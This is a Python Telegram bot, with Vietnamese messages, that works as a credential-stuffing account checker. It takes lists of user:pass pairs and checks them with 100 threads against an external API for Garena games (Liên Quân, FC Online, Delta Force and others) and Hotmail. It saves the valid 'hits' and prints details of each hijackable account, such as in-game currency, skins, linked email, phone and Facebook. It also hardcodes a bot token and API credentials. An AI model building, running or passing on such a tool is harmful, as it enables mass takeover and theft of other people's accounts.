# bot.py - GARENA CHECKER BOT - CHECK ĐƠN + NÚT CHỌN SERVICE
import subprocess
import sys
import importlib
import threading
import time
import json
import os
import re
import telebot
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

def install_package(package_name):
    try:
        importlib.import_module(package_name)
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name, "--no-cache-dir"])
        except:
            pass

for pkg in ["requests", "pyTelegramBotAPI"]:
    install_package(pkg)

# ========== CẤU HÌNH ==========
TELEGRAM_BOT_TOKEN = "6367532329:AAEem2DziNWKZtFrA8goj5PGTOI4MVT7IKA"
ADMIN_CHAT_ID = "5736655322"

API_BASE = "https://lol.nhatminh301.com"
API_USERNAME = "thaituduc"
API_PASSWORD = "thaituduc"

DEFAULT_THREADS = 100
DEFAULT_TIMEOUT = 30
DEFAULT_RETRIES = 3

OUTPUT_HITS = "hits.txt"
OUTPUT_DEAD = "dead.txt"
OUTPUT_FILTERED = "filtered_accounts.txt"

SERVICE_ROUTES = {
    "lienquan": {
        "route": "/api/lienquan",
        "desc": "Liên Quân Mobile",
        "icon": "🎮"
    },
    "miniworld": {
        "route": "/api/miniworld",
        "desc": "Mini World",
        "icon": "🌍"
    },
    "blockmango": {
        "route": "/api/blockmango",
        "desc": "Blockman Go",
        "icon": "🧱"
    },
    "deltaforce": {
        "route": "/api/deltaforce",
        "desc": "Delta Force",
        "icon": "🔫"
    },
    "hotmail": {
        "route": "/api/hotmail",
        "desc": "Hotmail",
        "icon": "📧"
    },
    "fc": {
        "route": "/api/fc",
        "desc": "FC Online",
        "icon": "⚽"
    },
    "fullpack": {
        "route": "/api/fullpack",
        "desc": "Fullpack",
        "icon": "📦"
    }
}

# ========== BIẾN TOÀN CỤC ==========
checking = False
stop_event = threading.Event()
filtered_accounts = []
pending_accounts = []  # Lưu accounts đang chờ check
stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0}
file_lock = threading.Lock()
stats_lock = threading.Lock()

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")

def is_admin(chat_id):
    return str(chat_id) == str(ADMIN_CHAT_ID)

# ========== LỌC TK MK ==========
def loc_tk_mk(content):
    accounts = []
    seen = set()
    lines = content.split('\n')
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        user = None
        pwd = None
        
        for sep in [':', '|', '/']:
            if sep in line:
                parts = line.split(sep, 1)
                user = parts[0].strip()
                pwd = parts[1].strip()
                break
        
        if user and pwd:
            user = re.sub(r'[^\w.@-]', '', user)
            pwd = pwd.strip()
            if len(user) > 0 and len(pwd) > 0:
                key = f"{user}:{pwd}"
                if key not in seen:
                    seen.add(key)
                    accounts.append((user, pwd))
    
    return accounts

# ========== CHECK API ==========
def check_account_api(username, password, service):
    route = SERVICE_ROUTES.get(service, {}).get("route", "/api/lienquan")
    url = f"{API_BASE}{route}"
    
    params = {
        "username": API_USERNAME,
        "password": API_PASSWORD,
        "tk": username,
        "mk": password
    }
    
    for attempt in range(DEFAULT_RETRIES):
        try:
            resp = requests.get(url, params=params, timeout=DEFAULT_TIMEOUT)
            
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if isinstance(data, dict):
                        if data.get("status") == True or data.get("success") == True:
                            data["result"] = "hit"
                        elif data.get("status") == False or data.get("success") == False:
                            data["result"] = "dead"
                        else:
                            if "uid" in data or "name" in data or "data" in data:
                                data["result"] = "hit"
                            else:
                                data["result"] = "dead"
                    return data
                except json.JSONDecodeError:
                    return {"result": "unknown", "raw": resp.text[:200]}
            elif resp.status_code == 429:
                time.sleep(5)
            else:
                time.sleep(1)
        except:
            time.sleep(2)
    
    return {"result": "error", "message": "Request failed"}

# ========== FORMAT HIT ĐẸP ==========
def format_hit_dep(username, password, data):
    if isinstance(data, str):
        try:
            data = json.loads(data)
        except:
            pass
    
    if not isinstance(data, dict):
        return f"""
━━━━━━━━━ ✅ HIT ━━━━━━━━━
🔑 <code>{username}:{password}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    
    uid = data.get("uid", "N/A")
    name = data.get("name", data.get("nickname", data.get("aov_name", "N/A")))
    region = data.get("region", "VN")
    shells = data.get("shells", data.get("so", 0))
    nap_so = data.get("nap_so", data.get("last_recharge", "N/A"))
    email = data.get("email", data.get("mail", ""))
    email_verified = data.get("email_verified", data.get("mail_verified", False))
    mobile = data.get("mobile", data.get("sdt", ""))
    mobile_bound = data.get("mobile_bound", data.get("sdt_bound", False))
    password_set = data.get("password_set", True)
    fb_linked = data.get("fb_linked", data.get("fb", False))
    fb_id = data.get("fb_id", data.get("fb_id", ""))
    aov_banned = data.get("aov_banned", data.get("banned", "NO"))
    last_login = data.get("last_login", data.get("last_login", "N/A"))
    created = data.get("created", data.get("tao_gr", data.get("created_at", "N/A")))
    aov_rank = data.get("aov_rank", data.get("rank", "N/A"))
    aov_level = data.get("aov_level", data.get("level", 0))
    aov_total_skins = data.get("aov_total_skins", data.get("skin", data.get("skins", 0)))
    aov_total_champs = data.get("aov_total_champs", data.get("hero", data.get("champs", 0)))
    qh = data.get("qh", data.get("quan_he", 0))
    cccd = data.get("cccd", data.get("cmnd", "No"))
    authen = data.get("authen", data.get("2fa", "No"))
    
    email_str = f"Yes [{email[:3]}***@{email.split('@')[1] if '@' in email else 'gmail.com'}] [ĐÃ XÁC THỰC]" if email_verified else "No"
    sdt_str = f"Yes [{mobile[:4]}***{mobile[-3:] if len(mobile) > 3 else ''}]" if mobile_bound else "No"
    pass_str = "Yes" if password_set else "No"
    fb_str = f"YES [{fb_id}]" if fb_linked else "NO"
    band_str = "YES" if str(aov_banned).upper() in ["YES", "TRUE", "1", "BANNED"] else "NO"
    cccd_str = "Yes" if cccd and cccd != "No" else "No"
    authen_str = "Yes" if authen and authen != "No" else "No"
    status_str = "Acc Có FB" if fb_linked else "Acc Thường"
    
    return f"""
━━━━━━━━━ ✅ HIT ━━━━━━━━━
🔑 <code>{username}:{password}</code>
👤 UID: <code>{uid}</code>
👤 Nickname: <code>{name}</code>
🌐 Region: <code>{region}</code>
💲 Sò: <code>{shells}</code>
💰 Nạp sò: <code>{nap_so}</code>
📩 EMAIL: {email_str}
📱 SĐT: {sdt_str}
🛡 PASS: {pass_str}
🔗 FB: {fb_str}
🚫 BAND: {band_str}
⏰ Login cuối: <code>{last_login}</code>
📅 Tạo GR: <code>{created}</code>
🔥 NAME: <code>{name}</code>
👑 RANK: <code>{aov_rank}</code>
✨ LEVEL: <code>{aov_level}</code>
💎 SKIN: <code>{aov_total_skins}</code>
💪 HERO: <code>{aov_total_champs}</code>
⚡️ QH: <code>{qh}</code>
📄 CCCD: {cccd_str}
🛡 Authen: {authen_str}
📋 Tình Trạng: {status_str}
━━━━━━━━━━━━━━━━━━━━━━━━━
"""

def format_dead_dep(username, password):
    return f"""
━━━━━━━━━ ❌ DEAD ━━━━━━━━━
🔑 <code>{username}:{password}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━
"""

# ========== TẠO NÚT CHỌN SERVICE ==========
def create_service_keyboard():
    """Tạo bàn phím chọn service"""
    keyboard = InlineKeyboardMarkup(row_width=2)
    buttons = []
    
    for key, value in SERVICE_ROUTES.items():
        btn = InlineKeyboardButton(
            f"{value['icon']} {value['desc']}",
            callback_data=f"check_{key}"
        )
        buttons.append(btn)
    
    # Thêm nút hủy
    buttons.append(InlineKeyboardButton("❌ Hủy", callback_data="cancel_check"))
    
    keyboard.add(*buttons)
    return keyboard

# ========== CHECK ĐƠN ==========
def check_single_account(chat_id, username, password, service="lienquan"):
    """Check 1 account đơn lẻ"""
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    bot.send_message(chat_id, f"🔍 Đang check <code>{username}:{password}</code> với {service_desc}...")
    
    result = check_account_api(username, password, service)
    result_type = result.get("result", "unknown")
    
    if result_type == "hit":
        with file_lock:
            with open(OUTPUT_HITS, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
        bot.send_message(chat_id, format_hit_dep(username, password, result))
    elif result_type == "dead":
        with file_lock:
            with open(OUTPUT_DEAD, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
        bot.send_message(chat_id, format_dead_dep(username, password))
    else:
        bot.send_message(chat_id, f"""
━━━━━━━━━ ⚠️ UNKNOWN ━━━━━━━━━
🔑 <code>{username}:{password}</code>
📌 Lỗi: Không xác định được trạng thái
━━━━━━━━━━━━━━━━━━━━━━━━━
""")

# ========== CHECK NHIỀU ACCOUNT ==========
def check_accounts_batch(chat_id, accounts, service):
    global checking, stats
    
    if checking:
        bot.send_message(chat_id, "⚠️ Đang check rồi!")
        return
    
    checking = True
    stop_event.clear()
    
    total = len(accounts)
    stats = {
        "total": total,
        "checked": 0,
        "hits": 0,
        "dead": 0,
        "errors": 0,
        "start_time": time.time()
    }
    
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    icon = SERVICE_ROUTES.get(service, {}).get("icon", "🔍")
    
    bot.send_message(chat_id, f"""
{icon} <b>BẮT ĐẦU CHECK</b>
📊 Tổng: <code>{total}</code> accounts
🎯 Service: <b>{service_desc}</b>
⚡ Threads: <code>{DEFAULT_THREADS}</code>
""")
    
    def process_single(user, pwd):
        if stop_event.is_set():
            return
        
        result = check_account_api(user, pwd, service)
        result_type = result.get("result", "unknown")
        
        with stats_lock:
            stats["checked"] += 1
            
            if result_type == "hit":
                stats["hits"] += 1
                with file_lock:
                    with open(OUTPUT_HITS, 'a', encoding='utf-8') as f:
                        f.write(f"{user}:{pwd}\n")
                try:
                    bot.send_message(chat_id, format_hit_dep(user, pwd, result))
                except:
                    pass
            elif result_type == "dead":
                stats["dead"] += 1
                with file_lock:
                    with open(OUTPUT_DEAD, 'a', encoding='utf-8') as f:
                        f.write(f"{user}:{pwd}\n")
            else:
                stats["errors"] += 1
            
            if stats["checked"] % 50 == 0:
                try:
                    elapsed = time.time() - stats["start_time"]
                    speed = stats["checked"] / elapsed if elapsed > 0 else 0
                    bot.send_message(chat_id, f"""
📊 <b>TIẾN ĐỘ</b>
✅ Checked: <code>{stats['checked']}/{total}</code>
🔴 Hits: <code>{stats['hits']}</code>
❌ Dead: <code>{stats['dead']}</code>
⚡ Speed: <code>{speed:.1f}</code> acc/s
""")
                except:
                    pass
    
    with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
        futures = {executor.submit(process_single, user, pwd): (user, pwd) 
                   for user, pwd in accounts}
        
        for future in as_completed(futures):
            if stop_event.is_set():
                executor.shutdown(wait=False)
                break
    
    checking = False
    elapsed = time.time() - stats["start_time"]
    
    result_msg = f"""
✅ <b>CHECK HOÀN TẤT!</b>
📊 Tổng: <code>{stats['total']}</code>
🔴 HIT: <code>{stats['hits']}</code>
❌ DEAD: <code>{stats['dead']}</code>
⚠️ Errors: <code>{stats['errors']}</code>
⏱ Thời gian: <code>{elapsed:.1f}s</code>
⚡ Tốc độ: <code>{stats['total']/elapsed:.1f}</code> acc/s
"""
    bot.send_message(chat_id, result_msg)
    
    if stats["hits"] > 0 and os.path.exists(OUTPUT_HITS):
        with open(OUTPUT_HITS, 'rb') as f:
            bot.send_document(chat_id, f, caption=f"✅ hits.txt ({stats['hits']} acc)")

# ========== XỬ LÝ CALLBACK ==========
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    global pending_accounts, filtered_accounts
    
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "❌ Bạn không có quyền!")
        return
    
    data = call.data
    
    if data.startswith("check_"):
        service = data.replace("check_", "")
        
        if service not in SERVICE_ROUTES:
            bot.answer_callback_query(call.id, "❌ Service không hợp lệ!")
            return
        
        # Xóa tin nhắn cũ
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        
        service_desc = SERVICE_ROUTES[service]["desc"]
        icon = SERVICE_ROUTES[service]["icon"]
        
        # Kiểm tra accounts
        if pending_accounts:
            accounts = pending_accounts
            pending_accounts = []
            
            if len(accounts) == 1:
                # Check đơn
                user, pwd = accounts[0]
                bot.send_message(call.message.chat.id, f"{icon} Đang check <code>{user}:{pwd}</code> với {service_desc}...")
                threading.Thread(target=check_single_account, args=(call.message.chat.id, user, pwd, service)).start()
            else:
                # Check batch
                filtered_accounts = accounts
                bot.send_message(call.message.chat.id, f"{icon} Đang check {len(accounts)} acc với {service_desc}...")
                threading.Thread(target=check_accounts_batch, args=(call.message.chat.id, accounts, service)).start()
        else:
            bot.answer_callback_query(call.id, "❌ Không có accounts để check!")
    
    elif data == "cancel_check":
        pending_accounts = []
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        bot.send_message(call.message.chat.id, "❌ Đã hủy check!")
    
    bot.answer_callback_query(call.id)

# ========== XỬ LÝ TEXT - GỬI TK MK ==========
@bot.message_handler(content_types=['text'])
def handle_text(message):
    if not is_admin(message.chat.id):
        return
    
    text = message.text.strip()
    if text.startswith('/'):
        return
    
    # Lọc tk mk
    accounts = loc_tk_mk(text)
    
    if not accounts:
        bot.reply_to(message, """
❌ <b>KHÔNG TÌM THẤY!</b>
Format đúng: <code>user:pass</code> hoặc <code>user|pass</code> hoặc <code>user/pass</code>

📌 Ví dụ:
<code>ZzkeconzZ:thanhoppa2001</code>
""")
        return
    
    # Lưu accounts vào pending
    global pending_accounts
    pending_accounts = accounts
    
    # Tạo preview
    preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:10]])
    total = len(accounts)
    
    msg = f"""
📌 <b>ĐÃ NHẬN {total} ACCOUNTS</b>

<b>Preview (10 dòng đầu):</b>
<code>{preview}</code>
{"..." if total > 10 else ""}

👇 <b>Chọn service để check:</b>
"""
    
    # Gửi tin nhắn với nút chọn
    bot.send_message(message.chat.id, msg, reply_markup=create_service_keyboard())

# ========== LỆNH /start ==========
@bot.message_handler(commands=['start'])
def cmd_start(message):
    if not is_admin(message.chat.id):
        return
    
    bot.send_message(message.chat.id, f"""
🤖 <b>GARENA CHECKER BOT</b>

📌 <b>CÁCH DÙNG:</b>

1️⃣ <b>GỬI TK MK</b>
Gửi trực tiếp <code>user:pass</code>
→ Chọn service bằng nút bấm

2️⃣ <b>LỌC TK MK TỪ FILE</b>
<code>/loc</code> - Hướng dẫn

3️⃣ <b>CHECK HÀNG LOẠT</b>
Gửi nhiều accounts
→ Chọn service bằng nút bấm

📌 <b>LỆNH KHÁC:</b>
<code>/hits</code> - Tải hits.txt
<code>/dead</code> - Tải dead.txt
<code>/status</code> - Trạng thái
<code>/stop</code> - Dừng check
<code>/clear</code> - Xóa pending

⚡ <b>THREADS:</b> {DEFAULT_THREADS}
""")

# ========== LỆNH /loc ==========
@bot.message_handler(commands=['loc'])
def cmd_loc(message):
    if not is_admin(message.chat.id):
        return
    
    bot.reply_to(message, """
📌 <b>LỌC TK MK TỪ TXT</b>

Gửi file .txt chứa danh sách tk mk
Bot lọc chỉ giữ <code>user:pass</code>

Hỗ trợ định dạng: <code>:</code> <code>|</code> <code>/</code>

VD nội dung:
<code>user1:pass123</code>
<code>user2|pass456</code>
<code>user3/pass789</code>

Sau khi gửi file, chọn service bằng nút bấm!
""")

# ========== XỬ LÝ FILE ==========
@bot.message_handler(content_types=['document'])
def handle_document(message):
    if not is_admin(message.chat.id):
        return
    
    global pending_accounts
    
    try:
        if not message.document.file_name.endswith('.txt'):
            bot.reply_to(message, "❌ Chỉ hỗ trợ file .txt!")
            return
        
        file_info = bot.get_file(message.document.file_id)
        content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        accounts = loc_tk_mk(content)
        
        if not accounts:
            bot.reply_to(message, "❌ Không tìm thấy user:pass trong file!")
            return
        
        pending_accounts = accounts
        
        with open(OUTPUT_FILTERED, 'w', encoding='utf-8') as f:
            for user, pwd in accounts:
                f.write(f"{user}:{pwd}\n")
        
        preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:20]])
        total = len(accounts)
        
        msg = f"""
✅ <b>LỌC XONG!</b>
📊 Tổng: <code>{total}</code> accounts

<b>Preview (20 dòng đầu):</b>
<code>{preview}</code>
{"..." if total > 20 else ""}

👇 <b>Chọn service để check:</b>
"""
        
        bot.send_message(message.chat.id, msg, reply_markup=create_service_keyboard())
        
    except Exception as e:
        bot.reply_to(message, f"❌ Lỗi: {e}")

# ========== LỆNH KHÁC ==========
@bot.message_handler(commands=['hits'])
def cmd_hits(message):
    if not is_admin(message.chat.id):
        return
    try:
        with open(OUTPUT_HITS, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="✅ hits.txt")
    except:
        bot.reply_to(message, "❌ Chưa có hits!")

@bot.message_handler(commands=['dead'])
def cmd_dead(message):
    if not is_admin(message.chat.id):
        return
    try:
        with open(OUTPUT_DEAD, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="❌ dead.txt")
    except:
        bot.reply_to(message, "❌ Chưa có dead!")

@bot.message_handler(commands=['status'])
def cmd_status(message):
    if not is_admin(message.chat.id):
        return
    
    if checking:
        elapsed = time.time() - stats.get("start_time", time.time())
        speed = stats["checked"] / elapsed if elapsed > 0 else 0
        bot.reply_to(message, f"""
📊 <b>TRẠNG THÁI</b>
🔄 Đang check: <b>YES</b>
✅ Checked: <code>{stats['checked']}/{stats['total']}</code>
🔴 HIT: <code>{stats['hits']}</code>
❌ DEAD: <code>{stats['dead']}</code>
⚡ Speed: <code>{speed:.1f}</code> acc/s
⏱ Thời gian: <code>{elapsed:.0f}s</code>
""")
    else:
        bot.reply_to(message, "💤 Bot đang rảnh")

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    if not is_admin(message.chat.id):
        return
    global checking
    stop_event.set()
    checking = False
    bot.reply_to(message, "🛑 Đã dừng check!")

@bot.message_handler(commands=['clear'])
def cmd_clear(message):
    if not is_admin(message.chat.id):
        return
    global pending_accounts
    pending_accounts = []
    bot.reply_to(message, "✅ Đã xóa danh sách pending!")

# ========== MAIN ==========
def main():
    print("=" * 60)
    print("    GARENA CHECKER BOT")
    print("    CHECK ĐƠN + NÚT CHỌN SERVICE")
    print("=" * 60)
    print(f"[*] Threads: {DEFAULT_THREADS}")
    print(f"[*] Services: {len(SERVICE_ROUTES)}")
    print("[*] Format: user:pass")
    print("=" * 60)
    
    try:
        bot.send_message(ADMIN_CHAT_ID, """
🤖 Bot đã khởi động!

📌 CÁCH DÙNG:
• Gửi user:pass -> Chọn service bằng nút
• Gửi file .txt -> Chọn service bằng nút
• /loc -> Hướng dẫn lọc file
""")
    except:
        pass
    
    print("[*] Bot đang chạy...")
    
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=60)
        except Exception as e:
            print(f"[!] Lỗi: {e}")
            time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Bot dừng!")
        sys.exit(0)
